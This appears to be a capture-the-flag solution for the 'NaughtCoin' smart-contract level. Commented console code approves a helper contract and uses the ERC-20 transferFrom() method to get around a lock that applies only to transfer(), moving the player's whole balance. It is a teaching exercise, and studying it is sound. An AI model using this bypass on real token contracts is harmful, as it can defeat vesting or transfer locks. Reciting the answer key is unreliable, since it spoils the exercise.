let myBalance = (await contract.balanceOf(player)).toString();
// >> returns 1000000000000000000000000

(await contract.balanceOf(instance)).toString();
// >> returns 0

// Reading through EIP-20 (and also looking at OZ's ERC-20 contract), we see
//  that there exists another method that allows us to transfer tokens:
//  transferFrom()

// Since NaughtCoin's contract has not imposed any additional modifiers and
//  restrictions on this method (just transfer()), we are free to use this
//  method to transfer our tokens -- remember that NaughtCoin inherits from
//  ERC20.sol, and so does have the transferFrom() method.

// Further reading EIP-20, we see that the _from account for transferFrom()
//  "must deliberately authorise the sender of the message via some mechanism"

// Indeed, the ERC20 contract has such a function for this, which is the
//  approve() function

// So, we will simply create a contract that calls transferFrom() to transfer
//  all NaughtCoins from our wallet to some address (e.g. our contract), deploy
//  this, and then before sending the transferFrom() message, we will make sure
//  to approve() the contract to transfer our funds -- we can do this using
//  web3.js functions

// In addition, since the typical ERC20 contract is very publicly available,
//  we'll take the chance to use the IERC20 interface.

// Create the NaughtyTransfer contract, deploy it via Remix IDE, then get its
//  address

// approve our contract to transfer our funds
await contract.approve(naughtyTransferContractAddress, myBalance);

// confirm that we've successfully approved our contract to transfer all our
//  funds
(await contract.allowance(player, naughtyTransferContractAddress)) == myBalance;
// >> returns true

// Call our attack code

(await contract.balanceOf(player)).toString();
// >> returns 0

(await contract.balanceOf(naughtyTransferContractAddress)).toString();
// >> returns 1000000000000000000000000
